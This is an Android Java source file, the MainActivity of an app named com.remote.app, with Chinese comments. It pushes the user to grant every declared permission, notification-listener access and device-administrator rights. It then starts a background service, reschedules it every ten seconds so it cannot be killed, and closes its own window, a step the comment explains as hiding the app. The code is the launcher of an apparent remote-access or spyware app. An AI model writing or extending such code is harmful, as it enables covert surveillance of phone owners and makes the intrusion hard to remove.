package com.remote.app;

import android.Manifest;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.util.Log;
import android.view.Gravity;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;


/**
 * MainActivity - 应用主活动
 * 
 * 负责权限申请和初始化
 * 兼容 Android 14+ (API 34+)
 */
public class MainActivity extends Activity {

    private DevicePolicyManager mDPM;
    private ComponentName mAdminName;
    
    // 权限请求码
    private static final int REQUEST_BASIC_PERMISSIONS = 1;
    private static final int REQUEST_BACKGROUND_LOCATION = 2;
    private static final int REQUEST_FOREGROUND_SERVICE = 3;
    private static final int REQUEST_NOTIFICATION = 4;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
        
        Log.d(Config.LOG_TAG, "MainActivity 已创建");
        
        boolean isNotificationServiceRunning = isNotificationServiceRunning();
        
        if (!isNotificationServiceRunning) {
            showInitializationToast();
            requestAllPermissions();
            enableDeviceAdminIfNeeded();
        }
        
        // 启动后台服务
        startMainService();
        
        // 关闭 MainActivity 以隐藏应用
        finish();
    }

    /**
     * 启动主服务（使用兼容的方式）
     */
    private void startMainService() {
        Intent intent = new Intent(this, MainService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Android 8.0+ 必须使用 startForegroundService
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        
        // 设置定时重启（防止服务被杀死）
        setupAlarmManager(intent);
    }

    /**
     * 设置 AlarmManager 定时重启服务
     */
    private void setupAlarmManager(Intent serviceIntent) {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            
            PendingIntent pendingIntent = PendingIntent.getService(
                getApplicationContext(), 
                1, 
                serviceIntent, 
                flags
            );
            
            // Android 12+ 需要 SCHEDULE_EXACT_ALARM 权限
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // 检查权限
                if (ContextCompat.checkSelfPermission(this, 
                        Manifest.permission.SCHEDULE_EXACT_ALARM) == PackageManager.PERMISSION_GRANTED) {
                    alarmManager.setRepeating(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, 
                        0, 
                        10000, 
                        pendingIntent
                    );
                } else {
                    // 如果没有权限，使用不精确的定时
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        10000,
                        pendingIntent
                    );
                }
            } else {
                alarmManager.setRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, 
                    0, 
                    10000, 
                    pendingIntent
                );
            }
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "AlarmManager 设置失败: " + e.getMessage());
        }
    }

    /**
     * 显示初始化提示 Toast
     */
    private void showInitializationToast() {
        Context context = getApplicationContext();
        CharSequence text = "初始化应用...\n请点击返回两次\n并启用所有权限";
        int duration = Toast.LENGTH_LONG;

        Toast toast = Toast.makeText(context, text, duration);

        TextView v = (TextView) toast.getView().findViewById(android.R.id.message);
        v.setTextColor(Color.RED);
        v.setTypeface(Typeface.DEFAULT_BOLD);
        v.setGravity(Gravity.CENTER_VERTICAL | Gravity.CENTER_HORIZONTAL);
        toast.show();
    }

    /**
     * 申请所有必要的权限
     */
    private void requestAllPermissions() {
        try {
            Context context = getApplicationContext();
            PackageInfo info = getPackageManager().getPackageInfo(
                context.getPackageName(), 
                PackageManager.GET_PERMISSIONS
            );
            
            if (info.requestedPermissions != null) {
                reqPermissions(this, info.requestedPermissions);
            }
        } catch (PackageManager.NameNotFoundException e) {
            Log.e(Config.LOG_TAG, "获取权限列表失败: " + e.getMessage());
        }
        
        // 打开通知监听设置
        try {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        } catch (Exception e) {
            Log.w(Config.LOG_TAG, "无法打开通知监听设置");
        }
    }

    /**
     * 权限申请方法（支持 Android 6.0+ 动态权限）
     */
    public void reqPermissions(Activity activity, String[] permissions) {
        if (activity == null || permissions == null || permissions.length == 0) return;

        List<String> basicPerms = new ArrayList<>();        // 基础权限
        List<String> bgLocationPerms = new ArrayList<>();   // 后台定位权限
        List<String> notificationPerms = new ArrayList<>(); // 通知权限
        List<String> foregroundServicePerms = new ArrayList<>(); // 前台服务权限

        for (String perm : permissions) {
            if (perm == null || perm.isEmpty()) continue;

            Log.d(Config.LOG_TAG, "检查权限: " + perm);

            // ========== Android 14+ (API 34+) 前台服务权限 ==========
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                if (isPermission(perm, new String[]{
                    Manifest.permission.FOREGROUND_SERVICE,
                    Manifest.permission.FOREGROUND_SERVICE_LOCATION,
                    Manifest.permission.FOREGROUND_SERVICE_MICROPHONE,
                    Manifest.permission.FOREGROUND_SERVICE_CAMERA
                })) {
                    foregroundServicePerms.add(perm);
                    continue;
                }
            }

            // ========== Android 13+ (API 33+) 通知权限 ==========
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (perm.equals(Manifest.permission.POST_NOTIFICATIONS)) {
                    notificationPerms.add(perm);
                    continue;
                }
            }

            // ========== Android 10+ (API 29+) 后台定位权限 ==========
            if (perm.equals(Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    bgLocationPerms.add(perm);
                    continue;
                }
            }

            // ========== Android 10+ (API 29+) 存储权限调整 ==========
            if (perm.equals(Manifest.permission.WRITE_EXTERNAL_STORAGE) ||
                perm.equals(Manifest.permission.READ_EXTERNAL_STORAGE)) {
                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
                    basicPerms.add(perm);
                }
                continue;
            }

            // ========== Android 12+ (API 31+) 精确定时权限 ==========
            if (perm.equals(Manifest.permission.SCHEDULE_EXACT_ALARM)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    basicPerms.add(perm);
                }
                continue;
            }

            // ========== 其他基础权限 ==========
            basicPerms.add(perm);
        }

        // 按顺序申请权限

        // 1. 申请基础权限
        if (!basicPerms.isEmpty()) {
            Log.d(Config.LOG_TAG, "申请基础权限: " + basicPerms.size() + " 项");
            ActivityCompat.requestPermissions(activity,
                basicPerms.toArray(new String[0]), REQUEST_BASIC_PERMISSIONS);
        }

        // 2. 申请前台服务权限（Android 14+）
        if (!foregroundServicePerms.isEmpty() && 
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            Log.d(Config.LOG_TAG, "申请前台服务权限: " + foregroundServicePerms.size() + " 项");
            ActivityCompat.requestPermissions(activity,
                foregroundServicePerms.toArray(new String[0]), REQUEST_FOREGROUND_SERVICE);
        }

        // 3. 申请通知权限（Android 13+）
        if (!notificationPerms.isEmpty() && 
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Log.d(Config.LOG_TAG, "申请通知权限");
            ActivityCompat.requestPermissions(activity,
                notificationPerms.toArray(new String[0]), REQUEST_NOTIFICATION);
        }

        // 4. 申请后台定位权限（需要先授予前台定位）
        if (!bgLocationPerms.isEmpty() && 
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(activity,
                    Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                Log.d(Config.LOG_TAG, "申请后台定位权限");
                ActivityCompat.requestPermissions(activity,
                    bgLocationPerms.toArray(new String[0]), REQUEST_BACKGROUND_LOCATION);
            }
        }
    }

    /**
     * 检查权限是否在给定的列表中
     */
    private boolean isPermission(String perm, String[] permList) {
        for (String p : permList) {
            if (perm.equals(p)) return true;
        }
        return false;
    }

    /**
     * 启用设备管理员（如果还没有）
     */
    private void enableDeviceAdminIfNeeded() {
        try {
            mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            mAdminName = new ComponentName(this, DeviceAdminReceiver.class);

            if (!mDPM.isAdminActive(mAdminName)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                    "点击激活以获得设备管理权限");
                startActivity(intent);
            }
        } catch (Exception e) {
            Log.w(Config.LOG_TAG, "设备管理员启用失败: " + e.getMessage());
        }
    }

    /**
     * 检查通知监听服务是否运行
     */
    private boolean isNotificationServiceRunning() {
        try {
            ContentResolver contentResolver = getContentResolver();
            String enabledNotificationListeners =
                    Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
            String packageName = getPackageName();
            return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "检查通知监听服务失败: " + e.getMessage());
            return false;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        Log.d(Config.LOG_TAG, "权限申请结果: requestCode=" + requestCode);
        
        // 根据请求码处理权限结果
        switch (requestCode) {
            case REQUEST_BASIC_PERMISSIONS:
            case REQUEST_FOREGROUND_SERVICE:
            case REQUEST_NOTIFICATION:
                // 基础权限申请完毕，继续其他操作
                break;
            case REQUEST_BACKGROUND_LOCATION:
                // 后台定位权限申请完毕
                break;
        }
    }
}
